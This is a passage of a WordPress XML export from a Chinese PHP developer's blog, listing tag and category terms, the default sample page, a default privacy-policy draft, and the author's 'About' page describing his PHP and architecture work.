		<wp:term_slug><![CDATA[safari]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[safari]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[71]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[session]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[session]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[35]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[shell]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Shell]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[66]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[sublime]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[sublime]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[31]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[svn]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[SVN]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[53]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[unicode]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[unicode]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[32]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[unix]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Unix]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[33]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[url]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[URL]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[54]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[utf-8]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[UTF-8]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[51]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[xhprof]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[xhprof]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[40]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[xss]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[xss]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[18]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[yii]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Yii]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[74]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e4%ba%8b%e4%bb%b6]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[事件]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[44]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e4%ba%8b%e5%8a%a1]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[事务]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[26]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e4%ba%ba%e5%b7%a5%e6%99%ba%e8%83%bd]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[人工智能]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[45]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e4%bc%98%e9%85%b7]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[优酷]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[60]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e4%bd%93%e9%aa%8c]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[体验]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[16]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e5%88%86%e5%b8%83%e5%bc%8f]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[分布式]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[30]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e5%89%8d%e7%ab%af]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[前端]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[23]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e5%8a%a0%e5%af%86]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[加密]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[46]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e5%8e%9f%e7%a0%81]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[原码]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[48]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e5%8f%8d%e7%a0%81]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[反码]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[73]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e5%90%8e%e7%ab%af]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[后端]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[37]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e5%93%8d%e5%ba%94%e5%bc%8f]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[响应式]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[62]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e5%ad%98%e5%82%a8%e5%bc%95%e6%93%8e]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[存储引擎]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[61]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e5%b9%b6%e5%8f%91]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[并发]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[83]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e5%be%ae%e6%9c%8d%e5%8a%a1]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[微服务]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[59]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%8e%88%e6%9d%83]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[授权]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[50]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%95%b0%e5%ad%a6]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[数学]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[1]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[uncategorized]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[未分类]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[6]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[jiagou]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[架构]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[25]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%9e%b6%e6%9e%84]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[架构]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[19]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%a8%a1%e6%9d%bf]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[模板]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[7]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[chengxuyushenghuo]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[程序与生活]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[12]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%ba%bf%e7%a8%8b]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[线程]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[9]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[jingyanfengxiang]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[经验分享]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[55]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%bc%96%e7%a0%81]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[编码]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[8]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[bianchengyuyan]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[编程语言]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[68]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%bd%91%e7%bb%9c]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[网络]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[36]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%87%aa%e9%80%82%e5%ba%94]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[自适应]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[75]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%8b%b1%e8%af%ad]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[英语]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[20]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%8f%9c%e5%8d%95]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[菜单]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[47]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%a1%a5%e7%a0%81]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[补码]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[27]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%a7%84%e8%8c%83]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[规范]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[4]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[xitong]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[计算机系统]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[58]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%ae%a4%e8%af%81]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[认证]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[3]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[sjms]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[设计模式]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[24]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%ae%be%e8%ae%a1%e6%a8%a1%e5%bc%8f]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[设计模式]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[17]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%b4%9f%e8%bd%bd]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[负载]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[38]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%b7%af%e5%be%84]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[路径]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[49]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%bd%ac%e8%bd%bd]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[转载]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[84]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%bf%90%e7%bb%b4]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[运维]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[13]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%bf%9b%e7%a8%8b]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[进程]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[43]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e9%80%82%e9%85%8d]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[适配]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[15]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e9%9b%86%e7%be%a4]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[集群]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[21]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e9%a2%84%e5%8a%a0%e8%bd%bd]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[预加载]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[79]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e9%a2%86%e5%9f%9f%e9%a9%b1%e5%8a%a8%e8%ae%be%e8%ae%a1]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[领域驱动设计]]></wp:term_name>
	</wp:term>
		
	<generator>https://wordpress.org/?v=5.2.4</generator>

		<item>
		<title>示例页面</title>
		<link>http://wp.veitor.net/sample-page/</link>
		<pubDate>Wed, 20 Nov 2019 14:11:04 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://wp.veitor.net/?page_id=2</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:paragraph -->
<p>这是示范页面。页面和博客文章不同，它的位置是固定的，通常会在站点导航栏显示。很多用户都创建一个“关于”页面，向访客介绍自己。例如：</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p>欢迎！我白天是个邮递员，晚上就是个有抱负的演员。这是我的网站。我住在天朝的帝都，有条叫做Jack的狗。</p></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>……或这个：</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p>XYZ Doohickey公司成立于1971年，自从建立以来，我们一直向社会贡献着优秀doohickies。我们的公司总部位于天朝魔都，有着超过两千名员工，对魔都政府税收有着巨大贡献。</p></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>而您，作为一个WordPress用户，我们建议您访问<a href="http://wp.veitor.net/wp-admin/">控制板</a>，删除本页面，然后添加您自己的页面。祝您使用愉快！</p>
<!-- /wp:paragraph -->]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2</wp:post_id>
		<wp:post_date><![CDATA[2019-11-20 22:11:04]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-11-20 14:11:04]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[closed]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[sample-page]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[page]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
														<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_page_template]]></wp:meta_key>
		<wp:meta_value><![CDATA[default]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>隐私政策</title>
		<link>http://wp.veitor.net/?page_id=3</link>
		<pubDate>Wed, 20 Nov 2019 14:11:04 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://wp.veitor.net/?page_id=3</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:heading --><h2>我们是谁</h2><!-- /wp:heading --><!-- wp:paragraph --><p>我们的站点地址是：http://wp.veitor.net。</p><!-- /wp:paragraph --><!-- wp:heading --><h2>我们收集何种及为何收集个人数据</h2><!-- /wp:heading --><!-- wp:heading {"level":3} --><h3>评论</h3><!-- /wp:heading --><!-- wp:paragraph --><p>当访客留下评论时，我们会收集评论表单所显示的数据，和访客的IP地址及浏览器的user agent字符串来帮助检查垃圾评论。</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>由您的电子邮件地址所生成的匿名化字符串（又称为哈希）可能会被提供给Gravatar服务确认您是否有使用该服务。Gravatar服务的隐私政策在此：https://automattic.com/privacy/。在您的评论获批准后，您的资料图片将在您的评论旁公开展示。</p><!-- /wp:paragraph --><!-- wp:heading {"level":3} --><h3>媒体</h3><!-- /wp:heading --><!-- wp:paragraph --><p>如果您向此网站上传图片，您应当避免上传那些有嵌入地理位置信息（EXIF GPS）的图片。此网站的访客将可以下载并提取此网站的图片中的位置信息。</p><!-- /wp:paragraph --><!-- wp:heading {"level":3} --><h3>联系表单</h3><!-- /wp:heading --><!-- wp:heading {"level":3} --><h3>Cookies</h3><!-- /wp:heading --><!-- wp:paragraph --><p>如果您在我们的站点上留下评论，您可以选择用cookies保存您的姓名、电子邮件地址和网站。这是通过让您可以不用在评论时再次填写相关内容而向您提供方便。这些cookies会保留一年。</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>If you visit our login page, we will set a temporary cookie to determine if your browser accepts cookies. This cookie contains no personal data and is discarded when you close your browser.</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>当您登录时，我们也会设置多个cookies来保存您的登录信息及屏幕显示选项。登录cookies会保留两天，而屏幕显示选项cookies会保留一年。如果您选择了“记住我”，您的登录会保留两周。如果您注销，登录cookies将被移除。</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>如果您编辑或发布文章，我们会在您的浏览器中保存一个额外的cookie。这个cookie不包含个人数据而只记录了您刚才编辑的文章的ID。这个小甜饼会保留一天。</p><!-- /wp:paragraph --><!-- wp:heading {"level":3} --><h3>其他站点的嵌入内容</h3><!-- /wp:heading --><!-- wp:paragraph --><p>此站点上的文章可能会包含嵌入的内容（如视频、图像、文章等）。来自其他站点的嵌入内容的行为和您直接访问这些其他站点没有区别。</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>这些站点可能会收集关于您的数据、使用cookies、嵌入额外的第三方跟踪程序及监视您与这些嵌入内容的交互，包括在您有这些站点的账户并登录了这些站点时，跟踪您与嵌入内容的交互。</p><!-- /wp:paragraph --><!-- wp:heading {"level":3} --><h3>统计</h3><!-- /wp:heading --><!-- wp:heading --><h2>我们与谁共享您的信息</h2><!-- /wp:heading --><!-- wp:heading --><h2>我们保留多久您的信息</h2><!-- /wp:heading --><!-- wp:paragraph --><p>如果您留下评论，评论和其元数据将被无限期保存。我们这样做以便能识别并自动批准任何后续评论，而不用将这些后续评论加入待审队列。</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>对于本网站的注册用户，我们也会保存用户在个人资料中提供的个人信息。所有用户可以在任何时候查看、编辑或删除他们的个人信息（除了不能变更用户名外）、站点管理员也可以查看及编辑那些信息。</p><!-- /wp:paragraph --><!-- wp:heading --><h2>您对您的信息有什么权利</h2><!-- /wp:heading --><!-- wp:paragraph --><p>如果您有此站点的账户，或曾经留下评论，您可以请求我们提供我们所拥有的您的个人数据的导出文件，这也包括了所有您提供给我们的数据。您也可以要求我们抹除所有关于您的个人数据。这不包括我们因管理、法规或安全需要而必须保留的数据。</p><!-- /wp:paragraph --><!-- wp:heading --><h2>我们将您的信息发送到哪</h2><!-- /wp:heading --><!-- wp:paragraph --><p>访客评论可能会被自动垃圾评论监测服务检查。</p><!-- /wp:paragraph --><!-- wp:heading --><h2>您的联系信息</h2><!-- /wp:heading --><!-- wp:heading --><h2>其他信息</h2><!-- /wp:heading --><!-- wp:heading {"level":3} --><h3>我们如何保护您的数据</h3><!-- /wp:heading --><!-- wp:heading {"level":3} --><h3>我们有何种数据泄露处理流程</h3><!-- /wp:heading --><!-- wp:heading {"level":3} --><h3>我们从哪些第三方接收数据</h3><!-- /wp:heading --><!-- wp:heading {"level":3} --><h3>我们通过用户数据进行何种自动决策及/或归纳</h3><!-- /wp:heading --><!-- wp:heading {"level":3} --><h3>行业监管披露要求</h3><!-- /wp:heading -->]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>3</wp:post_id>
		<wp:post_date><![CDATA[2019-11-20 22:11:04]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-11-20 14:11:04]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[closed]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[privacy-policy]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[page]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
														<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_page_template]]></wp:meta_key>
		<wp:meta_value><![CDATA[default]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>关于Veitor</title>
		<link>http://wp.veitor.net/about/</link>
		<pubDate>Sun, 30 Mar 2014 04:13:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=4</guid>
		<description></description>
		<content:encoded><![CDATA[<p>&lt;!--markdown--&gt;# 2018版</p><p>目前正从事PHP相关开发工作，主要方向为互联网垂直产品的架构和开发等。近期正在钻研的范围包括Swoole开发；PHP微服务架构实践，PHP应用Docker容器化；在PHP中实现领域驱动设计开发，实践CQRS、Event Sourcing等。欢迎对这方面感兴趣的朋友一起交流！</p><h1>2014版</h1><p>我只是一个IT行业里的不知名的小程序员，有着远大的抱负却不知何时可以实现。下面就简单的自我介绍一下吧。</p><p>我是一个典型的90后，今年（2014年）刚刚大学毕业，在家乡的一家互联网公司从事PHP开发工作。虽然在校时是计算机专业，但似乎对各方面都只是略懂。从小就对制作网站感兴趣。小学时把别人网站直接另存下来玩，初中时在各种自助建站的网站上弄个所谓的“网站”玩玩，高中时像模像样的参加了网站制作的比赛获得市级和省级的奖项。尽管如此，还只是停留于表面。在大学的最后的日子里，做了个决定，自学HTMLJSCSSPHP。就这样入了此行。</p><p>作为一名合格的互联网开发者，需要懂得的知识是要非常广泛非常全面的。当然，作为刚踏入这个行业的我，决定开通自己的博客，分享记录我的技术方面的工作和经验，也都是最基本的一些技术，希望有和我一样经历的同学一起交流。如果您有什么好的意见或建议，欢迎留言评论给我，另外不妨粉一下我的微博<a href="http://weibo.com/veitor" target="_blank" wb_screen_name="Veitor_424" id="mywb" 